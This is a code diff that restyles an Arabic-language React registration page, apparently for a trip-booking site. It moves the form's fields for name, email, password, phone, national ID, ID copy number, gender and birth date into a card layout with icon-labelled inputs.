@@ -1,5 +1,5 @@
 import { useState } from "react";
-import { ChevronRight } from "lucide-react";
+import { ChevronRight, User, Mail, Lock, Phone, IdCard, CalendarDays, FileText } from "lucide-react";
 import { Link, useLocation } from "wouter";
 import { BottomNav } from "./services";
 import { addData } from "@/lib/firebase";
@@ -74,31 +74,28 @@ export default function Register() {
     setLocation("/trip-booking");
   };
 
-  const textFields: {
+  const inputCls =
+    "w-full bg-background border-2 border-border rounded-xl px-4 py-3 pr-11 text-sm text-foreground placeholder:text-muted-foreground/60 focus:border-primary focus:outline-none focus:ring-4 focus:ring-primary/10 transition-all";
+
+  const Field = ({
+    label,
+    icon: Icon,
+    children,
+  }: {
     label: string;
-    key: keyof FormState;
-    placeholder: string;
-    type?: string;
-  }[] = [
-    { label: "الاسم الأول", key: "firstName", placeholder: "ادخل الاسم الأول" },
-    {
-      label: "الاسم الأخير",
-      key: "lastName",
-      placeholder: "ادخل الاسم الأخير",
-    },
-    {
-      label: "البريد الإلكتروني",
-      key: "email",
-      placeholder: "example@mail.com",
-      type: "email",
-    },
-    {
-      label: "كلمة المرور",
-      key: "password",
-      placeholder: "••••••••••",
-      type: "password",
-    },
-  ];
+    icon: React.ComponentType<{ className?: string }>;
+    children: React.ReactNode;
+  }) => (
+    <div className="space-y-1.5">
+      <label className="text-xs font-bold text-foreground/80 block text-right">
+        {label}
+      </label>
+      <div className="relative">
+        <Icon className="absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
+        {children}
+      </div>
+    </div>
+  );
 
   return (
     <div
@@ -107,128 +104,173 @@ export default function Register() {
       data-testid="page-register"
     >
       <SiteHeader />
-      <div className="relative h-48 overflow-hidden">
-        <div className="absolute inset-0 bg-muted" />
-        <div
-          className="absolute inset-0 bg-primary"
-          style={{ clipPath: "polygon(0 40%, 100% 0, 100% 100%, 0 100%)" }}
-        />
-        <div className="relative z-10 px-6 pt-6">
+
+      <div className="relative bg-gradient-to-l from-primary via-primary to-primary/80 overflow-hidden">
+        <div className="absolute inset-0 opacity-10 pointer-events-none">
+          <div className="absolute -top-20 -right-20 w-64 h-64 rounded-full bg-white blur-3xl" />
+          <div className="absolute -bottom-20 -left-20 w-72 h-72 rounded-full bg-white blur-3xl" />
+        </div>
+        <div className="relative max-w-3xl mx-auto px-6 pt-8 pb-16">
           <Link
             href="/"
-            className="inline-flex items-center justify-center w-8 h-8 rounded-full bg-card/20 text-primary-foreground hover:bg-card/40 transition-colors"
+            className="inline-flex items-center justify-center w-9 h-9 rounded-full bg-white/15 text-primary-foreground hover:bg-white/25 transition-colors backdrop-blur-sm"
             data-testid="link-back-home"
           >
             <ChevronRight className="w-5 h-5" />
           </Link>
+          <h1 className="text-3xl font-extrabold text-primary-foreground mt-5 text-right">
+            إنشاء حساب جديد
+          </h1>
+          <p className="text-primary-foreground/85 text-sm mt-2 text-right">
+            انضم إلينا لتجربة سفر سلسة وعروض حصرية على رحلاتك
+          </p>
         </div>
       </div>
 
-      <div className="flex-1 bg-primary px-6 pt-2 pb-6 flex flex-col gap-4 -mt-2">
-        <h1 className="text-xl font-bold text-primary-foreground text-right">
-          تسجيل
-        </h1>
+      <div className="flex-1 max-w-3xl mx-auto w-full px-4 -mt-10 pb-10">
+        <div className="bg-card rounded-3xl shadow-xl border border-border/60 p-6 sm:p-8">
+          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+            <Field label="الاسم الأول" icon={User}>
+              <input
+                type="text"
+                placeholder="ادخل الاسم الأول"
+                value={form.firstName}
+                onChange={(e) => update("firstName", e.target.value)}
+                className={inputCls}
+                data-testid="input-firstName"
+              />
+            </Field>
+            <Field label="الاسم الأخير" icon={User}>
+              <input
+                type="text"
+                placeholder="ادخل الاسم الأخير"
+                value={form.lastName}
+                onChange={(e) => update("lastName", e.target.value)}
+                className={inputCls}
+                data-testid="input-lastName"
+              />
+            </Field>
+            <Field label="البريد الإلكتروني" icon={Mail}>
+              <input
+                type="email"
+                placeholder="example@mail.com"
+                value={form.email}
+                onChange={(e) => update("email", e.target.value)}
+                className={inputCls}
+                data-testid="input-email"
+              />
+            </Field>
+            <Field label="كلمة المرور" icon={Lock}>
+              <input
+                type="password"
+                placeholder="••••••••••"
+                value={form.password}
+                onChange={(e) => update("password", e.target.value)}
+                className={inputCls}
+                data-testid="input-password"
+              />
+            </Field>
 
-        {textFields.map((f) => (
-          <div
-            key={f.key}
-            className="border-b border-primary-foreground/30 pb-2"
-          >
-            <input
-              type={f.type || "text"}
-              placeholder={f.placeholder}
-              value={form[f.key]}
-              onChange={(e) => update(f.key, e.target.value)}
-              className="w-full bg-transparent text-primary-foreground placeholder:text-primary-foreground/60 text-right text-sm focus:outline-none py-1"
-              data-testid={`input-${f.key}`}
-            />
+            <div className="space-y-1.5 sm:col-span-2">
+              <label className="text-xs font-bold text-foreground/80 block text-right">
+                رقم الجوال
+              </label>
+              <div className="flex gap-2">
+                <div className="relative flex-1">
+                  <Phone className="absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
+                  <input
+                    type="tel"
+                    placeholder="55xxxxxxx"
+                    value={form.phone}
+                    onChange={(e) => update("phone", e.target.value)}
+                    className={inputCls}
+                    data-testid="input-phone"
+                  />
+                </div>
+                <div className="bg-muted border-2 border-border rounded-xl px-3 py-3 flex items-center gap-1.5 text-sm font-bold text-foreground">
+                  <span>+</span>
+                  <input
+                    type="text"
+                    value={form.countryCode}
+                    onChange={(e) => update("countryCode", e.target.value)}
+                    className="w-10 bg-transparent text-center focus:outline-none"
+                    data-testid="input-country-code"
+                  />
+                </div>
+              </div>
+            </div>
+
+            <Field label="رقم الهوية الوطنية" icon={IdCard}>
+              <input
+                type="text"
+                placeholder="10xxxxxxxx"
+                value={form.nationalId}
+                onChange={(e) => update("nationalId", e.target.value)}
+                className={inputCls}
+                data-testid="input-national-id"
+              />
+            </Field>
+            <Field label="رقم النسخة" icon={FileText}>
+              <input
+                type="text"
+                placeholder="1000000008"
+                value={form.copyNumber}
+                onChange={(e) => update("copyNumber", e.target.value)}
+                className={inputCls}
+                data-testid="input-copy-number"
+              />
+            </Field>
+
+            <div className="space-y-1.5">
+              <label className="text-xs font-bold text-foreground/80 block text-right">
+                الجنس
+              </label>
+              <div className="relative">
+                <User className="absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
+                <select
+                  value={form.gender}
+                  onChange={(e) => update("gender", e.target.value)}
+                  className={`${inputCls} cursor-pointer appearance-none`}
+                  data-testid="select-gender"
+                >
+                  <option value="ذكر">ذكر</option>
+                  <option value="أنثى">أنثى</option>
+                </select>
+              </div>
+            </div>
+            <Field label="تاريخ الميلاد" icon={CalendarDays}>
+              <input
+                type="date"
+                value={form.birthDate}
+                onChange={(e) => update("birthDate", e.target.value)}
+                className={inputCls}
+                data-testid="input-birth-date"
+              />
+            </Field>
           </div>
-        ))}
 
-        <div className="border-b border-primary-foreground/30 pb-2 flex items-center gap-3 justify-end">
-          <input
-            type="tel"
-            placeholder="55######"
-            value={form.phone}
-            onChange={(e) => update("phone", e.target.value)}
-            className="flex-1 bg-transparent text-primary-foreground placeholder:text-primary-foreground/60 text-right text-sm focus:outline-none py-1"
-            data-testid="input-phone"
-          />
-          <input
-            type="text"
-            value={form.countryCode}
-            onChange={(e) => update("countryCode", e.target.value)}
-            className="w-14 bg-transparent text-primary-foreground text-center text-sm border-l border-primary-foreground/30 pl-2 focus:outline-none py-1 font-bold"
-            data-testid="input-country-code"
-          />
-        </div>
+          {error && (
+            <div
+              className="mt-5 bg-destructive/10 border border-destructive/30 text-destructive rounded-xl px-4 py-3 text-sm text-center font-medium"
+              data-testid="error-register"
+            >
+              {error}
+            </div>
+          )}
 
-        <div className="border-b border-primary-foreground/30 pb-2">
-          <input
-            type="text"
-            placeholder="رقم الهوية"
-            value={form.nationalId}
-            onChange={(e) => update("nationalId", e.target.value)}
-            className="w-full bg-transparent text-primary-foreground placeholder:text-primary-foreground/40 text-right text-sm focus:outline-none py-1"
-            data-testid="input-national-id"
-          />
-        </div>
-
-        <div className="border-b border-primary-foreground/30 pb-2">
-          <input
-            type="text"
-            placeholder="1000000008"
-            value={form.copyNumber}
-            onChange={(e) => update("copyNumber", e.target.value)}
-            className="w-full bg-transparent text-primary-foreground placeholder:text-primary-foreground/60 text-right text-sm focus:outline-none py-1"
-            data-testid="input-copy-number"
-          />
-        </div>
-
-        <div className="bg-card/20 rounded-xl px-4 py-3 border border-primary-foreground/20">
-          <select
-            value={form.gender}
-            onChange={(e) => update("gender", e.target.value)}
-            className="w-full bg-transparent text-primary-foreground text-right text-sm focus:outline-none appearance-none cursor-pointer"
-            data-testid="select-gender"
+          <button
+            onClick={() => void handleSubmit()}
+            disabled={submitting}
+            className="w-full mt-6 bg-primary text-primary-foreground py-4 rounded-xl font-extrabold text-base shadow-lg shadow-primary/25 hover:shadow-xl hover:shadow-primary/35 hover:-translate-y-0.5 transition-all duration-300 disabled:opacity-60 disabled:cursor-not-allowed disabled:transform-none"
+            data-testid="button-submit-register"
           >
-            <option value="ذكر" className="text-foreground bg-background">
-              ذكر
-            </option>
-            <option value="أنثى" className="text-foreground bg-background">
-              أنثى
-            </option>
-          </select>
-        </div>
+            {submitting ? "جاري الإرسال..." : "تسجيل"}
+          </button>
 
-        <div className="bg-card/20 rounded-xl px-4 py-3 border border-primary-foreground/20">
-          <input
-            type="date"
-            placeholder="تاريخ الولادة"
-            value={form.birthDate}
-            onChange={(e) => update("birthDate", e.target.value)}
-            className="w-full bg-transparent text-primary-foreground placeholder:text-primary-foreground/50 text-right text-sm focus:outline-none"
-            data-testid="input-birth-date"
-          />
-        </div>
-
-        {error && (
-          <p
-            className="text-red-100 bg-red-900/40 rounded-lg px-3 py-2 text-xs text-center"
-            data-testid="error-register"
-          >
-            {error}
+          <p className="text-center text-xs text-muted-foreground mt-4">
+            بإنشاء الحساب فإنك توافق على شروط الاستخدام وسياسة الخصوصية
           </p>
-        )}
-
-        <button
-          onClick={() => void handleSubmit()}
-          disabled={submitting}
-          className="w-full bg-muted text-foreground py-3.5 rounded-xl font-bold text-base hover:bg-background transition-colors mt-2 disabled:opacity-60 disabled:cursor-not-allowed"
-          data-testid="button-submit-register"
-        >
-          {submitting ? "جاري الإرسال..." : "تسجيل"}
-        </button>
+        </div>
       </div>
 
       <SiteFooter />
